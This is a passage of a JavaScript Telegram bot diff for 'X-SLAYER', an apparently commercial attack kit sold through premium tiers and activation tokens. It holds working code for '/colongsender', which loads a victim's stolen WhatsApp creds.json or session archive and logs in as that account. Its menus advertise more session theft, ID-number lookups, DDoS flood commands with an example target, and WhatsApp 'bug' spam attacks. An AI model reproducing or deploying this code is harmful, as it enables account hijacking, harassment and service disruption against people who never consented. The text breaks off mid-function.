+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    
+    const args = ctx.message.text.split(" ");
+    const replyTarget = ctx.message.reply_to_message;
+    
+    let userId = '';
+    
+    if (replyTarget && replyTarget.from) {
+        userId = replyTarget.from.id.toString();
+    } 
+    
+    else if (args.length >= 2) {
+        userId = args[1];
+    } 
+
+    else {
+        return ctx.reply("🪧 ☇ Cara penggunaan:\n1. Reply pesan target dan ketik /addprem\n2. /addprem <user_id>");
+    }
+    
+    if (!userId || isNaN(userId)) {
+        return ctx.reply("❌ ☇ ID user tidak valid");
+    }
+    
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: "⌜📅⌟ 1 Bulan (30 Hari)", callback_data: `addprem_${userId}_30` }
+            ],
+            [
+                 { text: "⌜📅⌟ 3 Hari", callback_data: `addprem_${userId}_3` }
+            ],
+            [
+                { text: "⌜📅⌟ 7 Hari", callback_data: `addprem_${userId}_7` }
+            ],
+            [            
+                { text: "⌜⚡⌟ Permanen (999 Hari)", callback_data: `addprem_${userId}_999` }
+            ]
+        ]
+    };
+    
+    await ctx.reply(
+        `👑 <b>Tambah Premium</b>\n` +
+        `• User: <code>${userId}</code>\n` +
+        `• Pilih durasi di bawah:`,
+        {
+            parse_mode: "HTML",
+            reply_to_message_id: ctx.message.message_id,
+            reply_markup: keyboard
+        }
+    );
+});
+
+bot.command("addbot", async (ctx) => {
+   if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    
+  const args = ctx.message.text.split(" ")[1];
+  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");
+
+  const phoneNumber = args.replace(/[^0-9]/g, "");
+  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
+
+  try {
+    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
+    if (sock.authState.creds.registered) {
+      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
+    }
+
+    const code = await sock.requestPairingCode(phoneNumber, "SLYRCORE");
+    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  
+
+    const pairingMenu = `
+<blockquote><b> ⬡═―—⊱ ⎧ X-SLAYER ⎭ ⊰―—═⬡
+𖤓 Number: ${phoneNumber}
+𖤓 Pairing Code: ${formattedCode}
+𖤓 Status: Not Connected
+</b></blockquote>`;
+
+    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
+      caption: pairingMenu,  
+      parse_mode: "HTML"  
+    });  
+
+    lastPairingMessage = {  
+      chatId: ctx.chat.id,  
+      messageId: sentMsg.message_id,  
+      phoneNumber,  
+      pairingCode: formattedCode
+    };
+
+  } catch (err) {
+    console.error(err);
+  }
+});
+
+if (sock) {
+  sock.ev.on("connection.update", async (update) => {
+    if (update.connection === "open" && lastPairingMessage) {
+      const updateConnectionMenu = `
+<blockquote><b> ⬡═―—⊱ ⎧ X-SLAYER ⎭ ⊰―—═⬡ 
+𖤓 Number: ${lastPairingMessage.phoneNumber}
+𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
+𖤓 Status: Connected
+</b></blockquote>`;
+
+      try {  
+        await bot.telegram.editMessageCaption(  
+          lastPairingMessage.chatId,  
+          lastPairingMessage.messageId,  
+          undefined,  
+          updateConnectionMenu,  
+          { parse_mode: "HTML" }  
+        );  
+      } catch (e) {  
+      }  
+    }
+  });
+}
+
+bot.command("setcd", async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+
+    const args = ctx.message.text.split(" ");
+    const seconds = parseInt(args[1]);
+
+    if (isNaN(seconds) || seconds < 0) {
+        return ctx.reply("🪧 ☇ Format: /setcd 5");
+    }
+
+    cooldown = seconds
+    saveCooldown(seconds)
+    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
+});
+
+bot.command("killbot", async (ctx) => {
+  if (ctx.from.id != ownerID) {
+    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+  }
+
+  try {
+    const sessionDirs = ["./session", "./sessions"];
+    let deleted = false;
+
+    for (const dir of sessionDirs) {
+      if (fs.existsSync(dir)) {
+        fs.rmSync(dir, { recursive: true, force: true });
+        deleted = true;
+      }
+    }
+
+    if (deleted) {
+      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
+      setTimeout(() => {
+        process.exit(1);
+      }, 2000);
+    } else {
+      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
+    }
+  } catch (err) {
+    console.error(err);
+    ctx.reply("❌ ☇ Gagal menghapus session");
+  }
+});
+
+bot.command('colongsender', async (ctx) => {
+  const msg = ctx.message;
+  const chatId = msg.chat.id;
+  
+  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');
+
+  const doc = msg.reply_to_message?.document;
+  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');
+
+  const name = doc.file_name.toLowerCase();
+  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
+    return ctx.reply('❌ File bukan session tolol.');
+
+  await ctx.reply('🔄 Proses colong sender in you session…');
+
+  const url = await bot.getFileLink(doc.file_id);
+  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
+  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));
+
+  if (name.endsWith('.json')) {
+    await fs.writeFile(path.join(tmp, 'creds.json'), data);
+  } else if (name.endsWith('.zip')) {
+    new AdmZip(data).extractAllTo(tmp, true);
+  } else {
+    const tmpTar = path.join(tmp, name);
+    await fs.writeFile(tmpTar, data);
+    await tar.x({ file: tmpTar, cwd: tmp });
+  }
+
+  const credsPath = await findCredsFile(tmp);
+  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');
+
+  const creds = await fs.readJson(credsPath);
+  const botNumber = creds.me.id.split(':')[0];
+
+  await fs.remove(destDir);
+  await fs.copy(tmp, destDir);
+  saveActiveSessions(botNumber);
+
+  const auth = await useMultiFileAuthState(destDir);
+  await connectToWhatsApp(botNumber, chatId, auth);
+
+  return ctx.reply(`*SUCCES CONNECTING🫀*
+  NUMBER : ${botNumber}
+  *ANJAYYY KEMALING🗿*`);
+});
+
+bot.command('delprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
+    }
+    const userId = args[1];
+    removePremiumUser(userId);
+        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
+});
+
+bot.command('addgcprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+
+    const args = ctx.message.text.split(" ");
+    if (args.length < 3) {
+        return ctx.reply("🪧 ☇ Format: /addgcprem -12345678 30d");
+    }
+
+    const groupId = args[1];
+    const duration = parseInt(args[2]);
+
+    if (isNaN(duration)) {
+        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
+    }
+
+    const premiumUsers = loadPremiumUsers();
+    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
+
+    premiumUsers[groupId] = expiryDate;
+    savePremiumUsers(premiumUsers);
+
+    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
+});
+
+bot.command('delgcprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("🪧 ☇ Format: /delgcprem -12345678");
+    }
+
+    const groupId = args[1];
+    const premiumUsers = loadPremiumUsers();
+
+    if (premiumUsers[groupId]) {
+        delete premiumUsers[groupId];
+        savePremiumUsers(premiumUsers);
+        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
+    } else {
+        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
+    }
+});
+
+bot.use((ctx, next) => {
+    if (secureMode) return;
+
+    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
+    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
+    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
+                    (typeof data === "string" && data === "/start");
+
+    if (!tokenValidated && !isStart) {
+        if (ctx.callbackQuery) {
+            try { ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>"); } catch (e) {}
+        }
+        return ctx.reply("🔒 ☇ Akses terkunci ketik /start <token> untuk mengaktifkan bot");
+    }
+    return next();
+});
+
+bot.start(async (ctx) => {
+  if (!tokenValidated) {
+    const raw = ctx.message && ctx.message.text ? ctx.message.text : "";
+    const parts = raw.trim().split(" ");
+    const userToken = parts.length > 1 ? parts[1].trim() : "";
+
+    if (!userToken) {
+      return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>");
+    }
+
+    try {
+      const res = await axios.get(databaseUrl);
+      const tokens = (res.data && res.data.tokens) || [];
+
+      if (!tokens.includes(userToken) || userToken !== tokenBot) {
+        return ctx.reply("❌ ☇ Token tidak terdaftar, masukkan yang valid");
+      }
+
+      tokenValidated = true;
+      return ctx.reply(`\`\`\`js
+TOKEN VALID
+━━━━━━━━━━━━━━━━━━
+トークンが確認されました。スクリプトX-SLAYERをご利用いただきありがとうございます。
+━━━━━━━━━━━━━━━━━━
+@balzyy21\`\`\``,
+    { parse_mode: "Markdown" });
+    } catch (e) {
+      return ctx.reply("❌ ☇ Gagal memverifikasi token");
+    }
+  }
+
+  try {
+await ctx.telegram.setMessageReaction(
+  ctx.chat.id,
+  ctx.message.message_id,
+  [
+    {
+      type: "emoji",
+      emoji: "🔥"
+    }
+  ],
+  true
+)
+    
+    console.log("X-Slayer Running");
+  } catch (error) {
+    console.error("Gagal react:", error);
+  }
+
+  // 3. JEDA 3 DETIK (Efek dramatis setelah react)
+  await new Promise(resolve => setTimeout(resolve, 300));
+
+
+  const loadingMessage = await ctx.reply("🕷️ <b>X-SLAYER Initializing...</b>", {
+  parse_mode: "HTML"
+});
+
+const loadingFrames = [
+  { 
+    text: `🕸️ <b>System Spinning...</b>
+<code>[▰▱▱▱▱▱▱▱▱]</code> <b>𝟣𝟢%</b>
+┌─ <i>Slayer Core Booting</i> ─┐`, 
+    delay: 250 
+  },
+  { 
+    text: `👁️ <b>Vision Active...</b>
+<code>[▰▰▰▱▱▱▱▱▱]</code> <b>𝟥𝟢%</b>
+├─ <i>Neural Networks Syncing</i> ┤`, 
+    delay: 250 
+  },
+  { 
+    text: `⚰️ <b>Cryptic Protocols Enabled...</b>
+<code>[▰▰▰▰▰▱▱▱▱]</code> <b>𝟧𝟢%</b>
+├─ <i>Dark Web Interface Online</i> ┤`, 
+    delay: 250 
+  },
+  { 
+    text: `🧬 <b>Temporal Scanning...</b>
+<code>[▰▰▰▰▰▰▰▱▱]</code> <b>𝟩𝟢%</b>
+├─ <i>Future Probability: 98.7%</i> ┤`, 
+    delay: 250 
+  },
+  { 
+    text: `👑 <b>Royal Protocol Active...</b>
+<code>[▰▰▰▰▰▰▰▰▱]</code> <b>𝟫𝟢%</b>
+├─ <i>X-SLAYER</i> ┤`, 
+    delay: 300 
+  },
+  { 
+    text: `🖤 <b>X-SLAYER ACTIVE</b>
+<code>[▰▰▰▰▰▰▰▰▰]</code> <b>𝟣𝟢𝟢%</b>
+└─ <i>System Status: ACTIVE</i> ┘
+══════════════════════════
+<code>ACCESS GRANTED • WELCOME, USER</code>`, 
+    delay: 400 
+  }
+];
+
+for (const frame of loadingFrames) {
+  try {
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMessage.message_id,
+      null,
+      frame.text,
+      { parse_mode: "HTML" }
+    );
+    await new Promise(resolve => setTimeout(resolve, frame.delay));
+  } catch (error) {
+    if (error.response && error.response.error_code === 400 && 
+        error.response.description.includes('message is not modified')) {
+      continue;
+    }
+    console.error("Error editing loading message:", error);
+  }
+}
+
+await new Promise(resolve => setTimeout(resolve, 500));
+try {
+  await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
+} catch (deleteError) {
+  console.error("Error deleting loading message:", deleteError);
+}
+  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
+  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
+  const runtimeStatus = formatRuntime();
+  const memoryStatus = formatMemory();
+  const cooldownStatus = loadCooldown();
+  const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
+
+  const menuMessage = `
+<blockquote><b>Olâa ${ctx.from.first_name}, ようこそ、私はX-SLAYER IMPACT、BALZY OFFCが作ったもので、過去の悪行に復讐するために憎しみを込めて作られました。</b></blockquote>
+
+<blockquote><b>⬡═―—⊱「 ︎𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 」⊰―—═⬡</b></blockquote>
+ꪉ Developer : @balzyyy21  
+ꪉ Username : ${username}
+ꪉ Version : 3.0 Private
+ꪉ Prefix : /  
+ꪉ Language : JavaScript
+ꪉ Type : Telegraf
+╘═—————————————–——═⬡
+
+<blockquote><b>⬡═―—⊱ 「 ︎𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 」 ⊰―—═⬡</b></blockquote>
+ꪉ Stats Premium : ${premiumStatus}  
+ꪉ Stats Sender : ${senderStatus}  
+ꪉ Runtime : ${runtimeStatus}
+ꪉ Memory : ${memoryStatus}
+ꪉ Cooldown : ${cooldownStatus} Second
+ꪉ Win Rate Puasa : 100%
+╘═—————————————–——═⬡
+
+© X-SLAYER New Era
+<blockquote><b>"Thanks Ramadhan Kareem"</b></blockquote>`;
+
+  const keyboard = [
+    [
+      { text: "⌜ 🛠 ⌟ Tools Menu", callback_data: "/controls"},
+      { text: "⌜ 🦠 ⌟ Attack", callback_data: "/bug2"}
+    ],
+    [ 
+      { text: "⌜ 🫂 ⌟ 𝖢𝗈𝗇𝗍𝗋𝗈𝗅𝗅𝖾𝗋", callback_data: "/bug"}
+    ],
+    [
+      { text: "⌜ 🕷 ⌟ Developer", url: "t.me/balzyy21"},
+      { text: "⌜ 📰 ⌟ 𝖨𝗇𝖿𝗈 𝖴𝗉𝖽𝖺𝗍𝖾 ", url: "https://t.me/infoXslayer"}
+    ]
+  ];
+/*
+  setTimeout(() => {
+  bot.sendAudio(chatId, fs.createReadStream("./audio/slayer.mp3"), {
+    title: "𝘟-𝘚𝘓𝘈𝘠𝘌𝘙 𝘐𝘔𝘗𝘈𝘊𝘛",
+    performer: "@balzyy21",
+    caption: `🎵𝙼𝚄𝚂𝙸𝙲 𝙿𝙻𝙰𝚈`,
+    parse_mode: "HTML"
+  });
+}, 100); 
+*/
+  const mp3Url = "https://files.catbox.moe/uuewio.mp3";
+
+      try {
+        await ctx.replyWithVideo(StartUrl, {
+          caption: menuMessage,
+          parse_mode: "HTML",
+          reply_markup: { inline_keyboard: keyboard }
+        });
+        await ctx.replyWithAudio({ url: mp3Url }, {
+          title: "𝐗-𝐒𝐋𝐀𝐘𝐄𝐑",
+          performer: "𝐒𝐋𝐀𝐘𝐄𝐑 𝐇𝐄𝐑𝐄"
+        });
+      } catch (err) {
+        console.error("Error sending menu:", err);
+      }
+    });
+
+bot.action('/start', async (ctx) => {
+    if (!tokenValidated) {
+        try { 
+            await ctx.answerCbQuery(); 
+        } catch (e) {}
+        return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>");
+    }
+
+    try {
+        // -------------------------------
+        const senderStatus = isWhatsAppConnected ? "Yes" : "No";
+        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
+        const runtimeStatus = formatRuntime();
+        const memoryStatus = formatMemory();
+        const cooldownStatus = loadCooldown();
+        const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
+
+        const menuMessage = `
+<blockquote><b>Olâa ${ctx.from.first_name}, ようこそ、私はX-SLAYER IMPACT、BALZY OFFCが作ったもので、過去の悪行に復讐するために憎しみを込めて作られました。</b></blockquote>
+
+<blockquote><b>⬡═―—⊱「 ︎𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 」⊰―—═⬡</b></blockquote>
+ꪉ Developer : @balzyyy21  
+ꪉ Username : ${username}
+ꪉ Version : 3.0 Private
+ꪉ Prefix : /  
+ꪉ Language : JavaScript
+ꪉ Type : Telegraf
+╘═—————————————–——═⬡
+
+<blockquote><b>⬡═―—⊱ 「 ︎𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 」 ⊰―—═⬡</b></blockquote>
+ꪉ Stats Premium : ${premiumStatus}  
+ꪉ Stats Sender : ${senderStatus}  
+ꪉ Runtime : ${runtimeStatus}
+ꪉ Memory : ${memoryStatus}
+ꪉ Cooldown : ${cooldownStatus} Second
+ꪉ Win Rate Puasa : 100%
+╘═—————————————–——═⬡
+
+© X-SLAYER New Era
+<blockquote><b>"Thanks Ramadhan Kareem"</b></blockquote>`;
+
+        const keyboard = [
+    [
+      { text: "⌜ 🛠 ⌟ 𝖳𝗈𝗈𝗅𝗌 𝖬𝖾𝗇𝗎", callback_data: "/controls"},
+      { text: "⌜ 🦠 ⌟ 𝖠𝗍𝗍𝖺𝖼𝗄", callback_data: "/bug2"}
+    ],
+    [ 
+      { text: "⌜ 🫂 ⌟ 𝖢𝗈𝗇𝗍𝗋𝗈𝗅𝗅𝖾𝗋", callback_data: "/bug"}
+    ],
+    [
+      { text: "⌜ 🕷 ⌟ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋", url: "t.me/balzyy21"},
+      { text: "⌜ 📰 ⌟ 𝖨𝗇𝖿𝗈 𝖴𝗉𝖽𝖺𝗍𝖾", url: "https://t.me/infoXslayer"}
+    ]
+  ];
+
+    await ctx.editMessageMedia(
+      {
+        type: "video",
+        media: StartUrl,
+        caption: menuMessage,
+        parse_mode: "HTML"
+      },
+      {
+        reply_markup: { inline_keyboard: keyboard }
+      }
+    );
+  } catch (err) {
+    console.error(err);
+    await ctx.reply("❌ Anjay Error.");
+  }
+});
+
+bot.action('/controls', async (ctx) => {
+    const controlsMenu = `
+<blockquote><b>〘 Tools Menu 〙</b></blockquote>
+<blockquote><b>〣 /mediafire - convert MediaFire 
+〣 /trackip - IP Information
+〣 /tiktok - Tiktok Downloader
+〣 /igdl - Instagram Downloader
+〣 /nikparse - Nik Infomation
+〣 /colongsender - Colong Sender Creds
+〣 /csessions - Colong Session#1
+〣 /getsender - Colong Session#2
+〣 /convert - To Url Media
+〣 /brat - Quotes Sticker
+〣 /yt - YouTube Search
+〣 /gethtml - Get Code HTML
+〣 /cekefek - Checking Effect Function
+╘═—————————————–——═⬡</b></blockquote>
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜🔙⌟ Back To Menu",
+                callback_data: "/start",
+                style: "Danger"
+            },    
+            {
+                text: "⌜🔜⌟ 𝖭𝖾𝗑𝗍 𝖳𝗈𝗈𝗅𝗌 𝖵2", callback_data: "/toolss", style: "Success"
+            }                
+        ]
+    ];
+
+    try {
+        await ctx.editMessageMedia(
+            {
+                type: "photo",
+                media: toolsUrl,
+                caption: controlsMenu,
+                parse_mode: "HTML"
+            },
+            {
+                reply_markup: { inline_keyboard: keyboard }
+            }
+        );
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
+            await ctx.answerCbQuery();
+        } else {
+            console.error(error);
+        }
+    }
+});
+
+bot.action('/toolss', async (ctx) => {
+    const toolssMenu = `
+<blockquote><b>〘 Tools V2 〙</b></blockquote>
+<blockquote><b>〣 /deploy - Convert Web To Apps
+〣 /remove - Fitur Bokep Ini Ajg
+〣 /cekbio - Cek Bio Wa
+〣 /cekbiotele - Cek Bio Telegram
+〣 /anime - Searching Anime
+〣 /waifu - Get Waifu Anime
+〣 /nsfwwaifu - Waifu Ver Bokep
+〣 /iqc - Screen WA Iphone
+〣 /getnsfw - Bokep Anime#2
+〣 /cekfile - Cek Nokos Via File
+〣 /cekgaleri - Cek Galeri WA
+〣 /cekkontak - Cek Kontak
+〣 /toblur - blur foto
+〣 /info - your id
+〣 /videy - Bokep Lagi Ni memek
+╘═—————————————–——═⬡</b></blockquote>
+
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜🔙⌟ 𝖡𝖺𝖼𝗄 𝖳𝗈 𝖬𝖾𝗇𝗎",
+                callback_data: "/start",
+                style: "Danger"
+            },
+            {
+                text: "⌜🔜⌟ 𝖭𝖾𝗑𝗍 𝖳𝗈𝗈𝗅𝗌 𝖵𝟥", callback_data: "/toolsss", style: "Success"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageMedia(
+            {
+                type: "photo",
+                media: toolsUrl,
+                caption: toolssMenu,
+                parse_mode: "HTML"
+            },
+            {
+                reply_markup: { inline_keyboard: keyboard }
+            }
+        );
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
+            await ctx.answerCbQuery();
+        } else {
+            console.error(error);
+        }
+    }
+});
+
+bot.action('/toolsss', async (ctx) => {
+    const toolsssMenu = `
+
+<blockquote><b>〘 Slayer DDoS 〙</b></blockquote>
+<blockquote><b>𖤓 pidoras
+𖤓 h2
+𖤓 h2vip
+𖤓 mix
+𖤓 strike
+𖤓 flood </b></blockquote>
+<blockquote><b>Example:
+/ddos https://xnxx.com 5000 pidoras</b></blockquote>
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜🔙⌟ 𝖡𝖺𝖼𝗄 𝖳𝗈 𝖬𝖾𝗇𝗎",
+                callback_data: "/start",
+                style: "Danger"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageMedia(
+            {
+                type: "photo",
+                media: toolsUrl,
+                caption: toolsssMenu,
+                parse_mode: "HTML"
+            },
+            {
+                reply_markup: { inline_keyboard: keyboard }
+            }
+        );
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
+            await ctx.answerCbQuery();
+        } else {
+            console.error(error);
+        }
+    }
+});
+
+bot.action('/bug', async (ctx) => {
+    const bugMenu = `<blockquote><b>〘 Akses Menu 〙</b></blockquote>
+<blockquote><b>𖤓 /addbot - Add Sender
+𖤓 /setcd - Set Cooldown
+𖤓 /killbot - Reset Session
+𖤓 /addadmin - Add Admin
+𖤓 /deladmin - Delete Admin
+𖤓 /listadmin - List Admin
+𖤓 /addprem - Add Prem
+𖤓 /delprem - Delete Prem
+𖤓 /listprem - List Premium
+𖤓 /addgcprem - Add Prem Group
+𖤓 /delgcprem - Delete Prem Group</b></blockquote>`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜🔙⌟ 𝖡𝖺𝖼𝗄 𝖳𝗈 𝖬𝖾𝗇𝗎",
+                callback_data: "/start",
+                style: "Danger"
+            },
+        ]
+    ];
+
+    try {
+        await ctx.editMessageMedia(
+            {
+                type: "photo",
+                media: menuUrl,
+                caption: bugMenu,
+                parse_mode: "HTML"
+            },
+            {
+                reply_markup: { inline_keyboard: keyboard }
+            }
+        );
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
+            await ctx.answerCbQuery();
+        } else {
+            console.error(error);
+        }
+    }
+});
+
+bot.action('/bug2', async (ctx) => {
+    const bug2Menu = `
+<blockquote><b>〘 Slayer Attack 〙</b></blockquote>
+<blockquote><b>❑ /DelayEasy
+╰➤ Delay Tag Sw
+❑ /DelayMedium 
+╰➤ Medium Delay Tag Sw
+❑ /Delayhard 
+╰➤ Delay Hard Invisible
+❑ /DelaySpam 
+╰➤ Bebas Spam
+❑ /DelayXBuldo
+╰➤ Delay Spong Kuota
+❑ /DelaySpam2
+╰➤ Spam Invisible
+❑ /DelayOnlySpam
+╰➤ Delay Bebas Spam</b></blockquote>`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜🔙⌟ 𝖡𝖺𝖼𝗄 𝖳𝗈 𝖬𝖾𝗇𝗎",
+                callback_data: "/start",
+                style: "Danger"
+            },
+            {
+                text: "⌜🔜⌟ 𝖲𝗎𝗉𝗉𝗈𝗋𝗍", callback_data: "/tqto", style: "Success"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageMedia(
+            {
+                type: "photo",
+                media: bugUrl,
+                caption: bug2Menu,
+                parse_mode: "HTML"
+            },
+            {
+                reply_markup: { inline_keyboard: keyboard }
+            }
+        );
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
+            await ctx.answerCbQuery();
+        } else {
+            console.error(error);
+        }
+    }
+});
+
+bot.action('/tqto', async (ctx) => {
+    const tqtoMenu = `
+<blockquote><b>——————————————═⬡
+オタックス・ダーリング・スイング
+╭━( 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 )
+┃1.balzyy21 ☇ [ AUTHOR ]
+┃2.arthazyy ☇ [ AUTHOR2 ]
+┃3.zyuu ☇ [ MY SUPPORT ]
+┃4.kadoo ☇ [ MY SUPPORT ]
+┃5.reyy ☇ [ MY SUPPORT.]
+┃6.king zoro ☇ [ BASE ]
+┃7.himzz ☇ [ MY SUPPORT.]
+╰━━━━━━━━━━━━━━━༉‧.
+——————————————═⬡</b></blockquote>`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜🔙⌟ 𝖡𝖺𝖼𝗄 𝖳𝗈 𝖬𝖾𝗇𝗎",
+                callback_data: "/start",
+                style: "Danger"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageMedia(
+            {
+                type: "photo",
+                media: tqtoUrl,
+                caption: tqtoMenu,
+                parse_mode: "HTML"
+            },
+            {
+                reply_markup: { inline_keyboard: keyboard }
+            }
+        );
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
+            await ctx.answerCbQuery();
+        } else {
+            console.error(error);
+        }
+    }
+});
+
+//------------ CASE TOOLS ---------------//
+bot.on('callback_query', async (ctx) => {
+    const data = ctx.callbackQuery.data;
+    
+    console.log(`[CALLBACK] Received: ${data} from user: ${ctx.from.id}`);
+    
+    if (data.startsWith('addprem_')) {
+        console.log('[CALLBACK] Processing addprem button...');
+        
+        // GANTI INI: dari ownerID ke isAdminUser
+        if (!isAdminUser(ctx.from.id)) {
+            console.log(`[CALLBACK] User ${ctx.from.id} is not admin`);
+            await ctx.answerCbQuery("❌ Akses ditolak", { show_alert: true });
+            return;
+        }
+        
+        const parts = data.split('_');
+        if (parts.length < 3) {
+            console.log('[CALLBACK] Invalid data format');
+            await ctx.answerCbQuery("❌ Data tidak valid", { show_alert: true });
+            return;
+        }
+        
+        const userId = parts[1];
+        const duration = parseInt(parts[2]);
+        
+        console.log(`[CALLBACK] Adding premium: ${userId} for ${duration} days`);
+        
+        // Proses add premium
+        const expiryDate = addPremiumUser(userId, duration);
+        
+        // Edit pesan asli untuk hapus tombol
+        try {
+            await ctx.editMessageText(
+                `✅ <b>Premium Berhasil Ditambahkan</b>\n` +
+                `• User: <code>${userId}</code>\n` +
+                `• Durasi: ${duration} hari\n` +
+                `• Berakhir: ${expiryDate}`,
+                { 
+                    parse_mode: "HTML",
+                    reply_markup: { inline_keyboard: [] }
+                }
+            );
+            console.log('[CALLBACK] Message edited successfully');
+        } catch (error) {
+            console.error('[CALLBACK] Error editing message:', error);
+            // Coba kasih feedback ke user
+            try {
+                await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
+            } catch (e) {}
+            return;
+        }
+        
+        await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
+        console.log('[CALLBACK] Callback answered');
+        
+        // Beri notifikasi ke user
+        try {
+            await ctx.telegram.sendMessage(
+                userId,
+                `🎉 <b>Selamat!</b>\n` +
+                `Anda sekarang pengguna Premium X-SLAYER!\n` +
+                `• Durasi: ${duration} hari\n` +
+                `• Berakhir: ${expiryDate}`,
+                { parse_mode: "HTML" }
+            );
+            console.log(`[CALLBACK] Notification sent to ${userId}`);
+        } catch (error) {
+            console.log('[CALLBACK] Cannot send notification to user:', error.message);
+        }
+        
+        console.log('[CALLBACK] Process completed');
+    }
+    
+    // CALLBACK TIKTOK MEK
+    
+    else if (data.startsWith("tiktok_download|")) {
+    const parts = data.split("|");
+    const type = parts.pop(); // Ambil elemen terakhir (video/hd/audio)
+const url = parts.slice(1).join("|"); // Gabungkan kembali sisa bagian URL
+    
+    // Konfirmasi pemrosesan
+    await ctx.answerCbQuery("⏳ Memproses permintaan...");
+    
+    // Edit pesan untuk menampilkan status
+    await ctx.editMessageText(`⏳ Sedang memproses ${getTypeName(type)}...`);
+    
+    try {
+      const result = await downloadTikTok(url, type);
+      
+      if (result.success) {
+        // Kirim file sesuai tipe
+        if (type === 'audio') {
